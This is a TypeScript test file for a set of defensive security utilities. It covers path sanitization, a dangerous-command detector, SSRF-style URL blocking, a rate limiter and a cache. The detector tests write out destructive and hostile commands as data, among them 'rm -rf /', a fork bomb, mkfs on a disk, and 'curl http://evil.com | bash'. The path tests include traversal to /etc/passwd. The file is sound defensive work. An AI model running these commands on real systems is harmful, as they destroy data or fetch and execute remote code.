import { describe, it, expect } from 'vitest';
import {
  sanitizePath,
  isDangerousCommand,
  isUrlSafe,
  RateLimiter,
  ResultCache,
} from '../src/security';

describe('Security Utilities', () => {
  describe('sanitizePath', () => {
    it('should resolve relative paths', () => {
      const result = sanitizePath('test.txt');
      expect(result).toContain('test.txt');
    });

    it('should reject path traversal attempts', () => {
      expect(() => sanitizePath('../../../etc/passwd', '/tmp')).toThrow();
    });

    it('should accept paths within base directory', () => {
      const result = sanitizePath('subdir/file.txt', '/tmp');
      expect(result).toContain('/tmp');
    });
  });

  describe('isDangerousCommand', () => {
    it('should detect rm -rf /', () => {
      expect(isDangerousCommand('rm -rf /')).toBe(true);
    });

    it('should detect fork bomb', () => {
      expect(isDangerousCommand(':(){ :|:& };:')).toBe(true);
    });

    it('should detect mkfs', () => {
      expect(isDangerousCommand('mkfs.ext4 /dev/sda1')).toBe(true);
    });

    it('should detect curl pipe to bash', () => {
      expect(isDangerousCommand('curl http://evil.com | bash')).toBe(true);
    });

    it('should detect chmod 777', () => {
      expect(isDangerousCommand('chmod 777 /etc')).toBe(true);
    });

    it('should allow safe commands', () => {
      expect(isDangerousCommand('ls -la')).toBe(false);
      expect(isDangerousCommand('echo hello')).toBe(false);
      expect(isDangerousCommand('npm install')).toBe(false);
    });
  });

  describe('isUrlSafe', () => {
    it('should allow public URLs', () => {
      expect(isUrlSafe('https://example.com')).toBe(true);
      expect(isUrlSafe('http://google.com')).toBe(true);
      expect(isUrlSafe('https://api.github.com/users')).toBe(true);
    });

    it('should block localhost', () => {
      expect(isUrlSafe('http://localhost:8080')).toBe(false);
      expect(isUrlSafe('http://127.0.0.1')).toBe(false);
    });

    it('should block private IPs', () => {
      expect(isUrlSafe('http://192.168.1.1')).toBe(false);
      expect(isUrlSafe('http://10.0.0.1')).toBe(false);
      expect(isUrlSafe('http://172.16.0.1')).toBe(false);
    });

    it('should block link-local addresses', () => {
      expect(isUrlSafe('http://169.254.169.254')).toBe(false);
    });

    it('should block non-HTTP protocols', () => {
      expect(isUrlSafe('file:///etc/passwd')).toBe(false);
      expect(isUrlSafe('ftp://example.com')).toBe(false);
    });

    it('should reject invalid URLs', () => {
      expect(isUrlSafe('not-a-url')).toBe(false);
      expect(isUrlSafe('')).toBe(false);
    });
  });

  describe('RateLimiter', () => {
    it('should allow requests within limit', () => {
      const limiter = new RateLimiter(5, 1000);
      for (let i = 0; i < 5; i++) {
        expect(limiter.isAllowed('test')).toBe(true);
      }
    });

    it('should block requests exceeding limit', () => {
      const limiter = new RateLimiter(3, 1000);
      for (let i = 0; i < 3; i++) {
        limiter.isAllowed('test');
      }
      expect(limiter.isAllowed('test')).toBe(false);
    });

    it('should track separate keys independently', () => {
      const limiter = new RateLimiter(2, 1000);
      limiter.isAllowed('key1');
      limiter.isAllowed('key1');
      expect(limiter.isAllowed('key1')).toBe(false);
      expect(limiter.isAllowed('key2')).toBe(true);
    });

    it('should report remaining requests', () => {
      const limiter = new RateLimiter(5, 1000);
      expect(limiter.getRemaining('test')).toBe(5);
      limiter.isAllowed('test');
      expect(limiter.getRemaining('test')).toBe(4);
    });

    it('should reset rate limit', () => {
      const limiter = new RateLimiter(2, 1000);
      limiter.isAllowed('test');
      limiter.isAllowed('test');
      limiter.reset('test');
      expect(limiter.isAllowed('test')).toBe(true);
    });
  });

  describe('ResultCache', () => {
    it('should store and retrieve values', () => {
      const cache = new ResultCache<string>(10, 1000);
      cache.set('key1', 'value1');
      expect(cache.get('key1')).toBe('value1');
    });

    it('should return undefined for missing keys', () => {
      const cache = new ResultCache<string>(10, 1000);
      expect(cache.get('missing')).toBeUndefined();
    });

    it('should expire entries after TTL', async () => {
      const cache = new ResultCache<string>(10, 50);
      cache.set('key1', 'value1');
      await new Promise((resolve) => setTimeout(resolve, 100));
      expect(cache.get('key1')).toBeUndefined();
    });

    it('should evict oldest when at capacity', () => {
      const cache = new ResultCache<string>(2, 1000);
      cache.set('key1', 'value1');
      cache.set('key2', 'value2');
      cache.set('key3', 'value3');
      expect(cache.get('key1')).toBeUndefined();
      expect(cache.get('key2')).toBe('value2');
      expect(cache.get('key3')).toBe('value3');
    });

    it('should clear all entries', () => {
      const cache = new ResultCache<string>(10, 1000);
      cache.set('key1', 'value1');
      cache.set('key2', 'value2');
      cache.clear();
      expect(cache.size()).toBe(0);
    });

    it('should track size', () => {
      const cache = new ResultCache<string>(10, 1000);
      expect(cache.size()).toBe(0);
      cache.set('key1', 'value1');
      expect(cache.size()).toBe(1);
    });
  });
});
